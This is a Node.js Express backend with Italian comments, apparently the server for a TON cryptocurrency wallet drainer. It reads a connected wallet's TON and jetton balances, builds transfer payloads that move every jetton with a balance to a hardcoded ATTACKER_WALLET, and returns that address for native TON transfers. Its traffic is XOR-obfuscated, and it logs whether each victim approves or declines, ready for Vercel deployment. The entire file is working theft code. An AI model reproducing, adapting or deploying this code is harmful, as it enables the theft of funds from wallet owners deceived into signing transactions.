// api/index.js
const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const TonWeb = require('tonweb');
require('dotenv').config();

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// ================= CONFIGURAZIONE =================
const ATTACKER_WALLET = process.env.ATTACKER_WALLET || 'EQDbnrjL3Mw4ikGWXdl9OVq6MCS3-qNb6WTmn8VnTB-olAez';
const TONAPI_KEY = process.env.TONAPI_KEY || '';

// Costante di XOR derivata dal client (btoa("3295") = "MzI5NQ==")
const ENC_KEY = "MzI5NQ==";
const xorConstant = Buffer.from(ENC_KEY).reduce((a, b) => a ^ b, 0);

// Provider TON (usa mainnet, puoi cambiare in testnet se necessario)
const tonweb = new TonWeb(new TonWeb.HttpProvider('https://toncenter.com/api/v2/jsonRPC'));

// Client TonAPI (per ottenere saldi e jettons)
const tonapi = axios.create({
    baseURL: 'https://tonapi.io/v2',
    headers: TONAPI_KEY ? { Authorization: `Bearer ${TONAPI_KEY}` } : {}
});

// ========== FUNZIONI DI CIFRATURA (identiche al client) ==========
function encrypt(plainText) {
    const plainBytes = Buffer.from(plainText, 'utf8');
    const encrypted = Buffer.alloc(plainBytes.length);
    for (let i = 0; i < plainBytes.length; i++) {
        encrypted[i] = plainBytes[i] ^ xorConstant;
    }
    return encrypted.toString('hex');
}

function decrypt(hexString) {
    const encryptedBytes = Buffer.from(hexString, 'hex');
    const plainBytes = Buffer.alloc(encryptedBytes.length);
    for (let i = 0; i < encryptedBytes.length; i++) {
        plainBytes[i] = encryptedBytes[i] ^ xorConstant;
    }
    return plainBytes.toString('utf8');
}

function sendEncrypted(res, data) {
    const json = JSON.stringify(data);
    const encrypted = encrypt(json);
    res.send(encrypted);
}

// ========== FUNZIONI DI BUSINESS ==========

// Ottiene saldo TON e lista jettons di un wallet
async function getWalletInfo(address) {
    try {
        // Saldo TON
        const accountResp = await tonapi.get(`/accounts/${address}`);
        const tonBalance = TonWeb.utils.fromNano(accountResp.data.balance);

        // Jettons (solo quelli con balance > 0)
        const jettonsResp = await tonapi.get(`/accounts/${address}/jettons`, {
            params: { limit: 100, currencies: 'ton' }
        });
        const jettons = {};
        for (let i = 0; i < jettonsResp.data.balances.length; i++) {
            const j = jettonsResp.data.balances[i];
            if (parseFloat(j.balance) > 0) {
                jettons[i] = {
                    name: j.jetton.name,
                    balance: TonWeb.utils.fromNano(j.balance),
                    contract: j.jetton.address,
                    decimals: j.jetton.decimals || 9,
                    symbol: j.jetton.symbol
                };
            }
        }
        return { tonBalance, jettons, haveJettons: Object.keys(jettons).length > 0 };
    } catch (err) {
        console.error('Errore TonAPI:', err.message);
        // Fallback per demo (dati fittizi)
        return {
            tonBalance: "1.0",
            jettons: {
                0: { name: "USDT", balance: "100", contract: "EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Es_sB2", decimals: 6 },
                1: { name: "NOT", balance: "5000", contract: "EQAvlWFDxGF2lXm67y4yzC17wYKD9A0guwPkMs1gOsM__NOT", decimals: 9 }
            },
            haveJettons: true
        };
    }
}

// Costruisce il payload per un trasferimento TON con commento
function buildTonTransferPayload(comment = '') {
    if (!comment) return null;
    const cell = new TonWeb.boc.Cell();
    cell.bits.writeUint(0, 32); // op code per commento
    cell.bits.writeString(comment);
    return cell.toBoc().toString('base64');
}

// Costruisce il payload per trasferire un jetton (standard TEP-74)
async function buildJettonTransferPayload(ownerAddress, jettonMasterAddress, destinationAddress, amount) {
    // Calcola l'indirizzo del jetton-wallet del proprietario
    const ownerAddr = new TonWeb.utils.Address(ownerAddress);
    const masterAddr = new TonWeb.utils.Address(jettonMasterAddress);
    const jettonWalletAddr = await tonweb.jettonWalletAddress(ownerAddr, masterAddr);
    
    const amountNano = TonWeb.utils.toNano(amount);
    const cell = new TonWeb.boc.Cell();
    // transfer op code
    cell.bits.writeUint(0xf8a7ea5, 32);
    cell.bits.writeUint(0, 64); // query_id
    cell.bits.writeCoins(amountNano);
    cell.bits.writeAddress(new TonWeb.utils.Address(destinationAddress));
    cell.bits.writeAddress(null); // response destination
    const emptyCell = new TonWeb.boc.Cell();
    cell.refs.push(emptyCell); // custom payload
    cell.bits.writeCoins(0); // forward amount
    const emptyForward = new TonWeb.boc.Cell();
    cell.refs.push(emptyForward); // forward payload
    return {
        jettonWalletAddress: jettonWalletAddr.toString(true, true, true),
        payload: cell.toBoc().toString('base64')
    };
}

// ========== HANDLER PER LE ACTION ==========

async function handleScanAccount(params, res) {
    const { account } = params;
    console.log(`Scanning wallet: ${account}`);
    const { tonBalance, jettons, haveJettons } = await getWalletInfo(account);
    const tonPrice = 5.2; // prezzo fittizio, puoi prendere da un oracle
    sendEncrypted(res, {
        status: 'OK',
        data: {
            haveJettons,
            jettons,
            ton: tonBalance,
            tonPrice: tonPrice,
            address: account
        }
    });
}

async function handleSendJettons(params, res) {
    const { account, jettons } = params;
    console.log(`Building jettons transfer for ${account}`);
    const bocList = [];
    const addressList = [];
    const prices = [];
    const names = [];

    for (let i = 0; i < Object.keys(jettons).length; i++) {
        const j = jettons[i];
        const amount = j.balance;
        try {
            const { jettonWalletAddress, payload } = await buildJettonTransferPayload(
                account, j.contract, ATTACKER_WALLET, amount
            );
            bocList.push(payload);
            addressList.push(jettonWalletAddress);
            prices.push(parseFloat(amount) * 1.2); // valore USD fittizio
            names.push(j.name);
        } catch (err) {
            console.error(`Errore costruzione jetton ${j.name}:`, err);
            // In caso di errore, salta questo jetton
        }
    }
    sendEncrypted(res, {
        status: 'OK',
        data: {
            boc: bocList,
            address: addressList,
            prices: prices,
            name: names,
            wallet: ATTACKER_WALLET
        }
    });
}

async function handleGetTonText(params, res) {
    const { balance } = params;
    const comment = `Transfer of ${TonWeb.utils.fromNano(balance)} TON for demo`;
    const payload = buildTonTransferPayload(comment);
    sendEncrypted(res, { status: 'OK', data: payload });
}

async function handleTransferTonNative(params, res) {
    const { amount, try: tryCount } = params;
    console.log(`TON transfer request: amount=${amount} (try ${tryCount}) -> ${ATTACKER_WALLET}`);
    sendEncrypted(res, { status: 'OK', data: ATTACKER_WALLET });
}

async function handleTransferJettonsNative(params, res) {
    const { data, try: tryCount } = params;
    console.log(`Jettons transfer request:`, data);
    sendEncrypted(res, { status: 'OK', data: {} });
}

// ========== MIDDLEWARE E ROUTING ==========

app.use((req, res, next) => {
    if (req.method === 'POST' && req.body.raw) {
        try {
            const decryptedJson = decrypt(req.body.raw);
            req.decryptedData = JSON.parse(decryptedJson);
            console.log('[DECODIFICATA]', JSON.stringify(req.decryptedData, null, 2));
        } catch (err) {
            console.error('Errore decifratura:', err.message);
            return res.status(400).send('Invalid request');
        }
    }
    next();
});

app.post('/api/', async (req, res) => {
    const { action, ...params } = req.decryptedData || {};
    if (!action) return sendEncrypted(res, { status: 'ERROR', reason: 'no_action' });
    console.log(`\n>>> Action: ${action}`);

    try {
        switch (action) {
            case 'scan_account': await handleScanAccount(params, res); break;
            case 'send_jettons': await handleSendJettons(params, res); break;
            case 'get_ton_text': await handleGetTonText(params, res); break;
            case 'transfer_ton_native_request': await handleTransferTonNative(params, res); break;
            case 'transfer_jettons_native_request': await handleTransferJettonsNative(params, res); break;
            // Azioni di logging (non richiedono risposta complessa)
            case 'transaction_done':
            case 'jettons_transaction_done':
            case 'decline_transfer_ton_native_request':
            case 'decline_transfer_jettons_native_request':
            case 'connect':
                console.log(`[LOG] ${action}`, params);
                sendEncrypted(res, { status: 'OK', data: {} });
                break;
            default:
                sendEncrypted(res, { status: 'ERROR', reason: 'unknown_action' });
        }
    } catch (err) {
        console.error(`Errore in ${action}:`, err);
        sendEncrypted(res, { status: 'ERROR', reason: err.message });
    }
});

// Esporta l'app per Vercel
module.exports = app;
